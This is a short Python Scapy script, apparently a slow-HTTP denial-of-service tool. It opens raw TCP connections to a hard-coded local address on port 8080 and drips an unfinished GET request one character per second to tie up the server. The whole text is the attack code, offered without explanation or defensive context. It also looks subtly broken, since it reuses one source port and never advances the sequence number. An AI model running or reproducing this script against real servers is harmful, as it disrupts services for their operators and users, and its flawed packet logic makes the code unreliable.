import time
from scapy.all import *

target_ip = "192.168.1.128"
target_port = 8080
src_port = 12345
num_con = 100

http_request = "GET / HTTP/1.1\r\nHost: " + target_ip
for i in range(num_con):
    ip_layer = IP(dst=target_ip)
    tcp_layer = TCP(dport=target_port, sport=src_port, flags="S")
    syn_ack = sr1(ip_layer/tcp_layer)
    tcp_layer.flags = "A"
    tcp_layer.seq = syn_ack.ack
    tcp_layer.ack = syn_ack.seq + 1
    for char in http_request:
        send(ip_layer/tcp_layer/Raw(load=char))
        time.sleep(1)
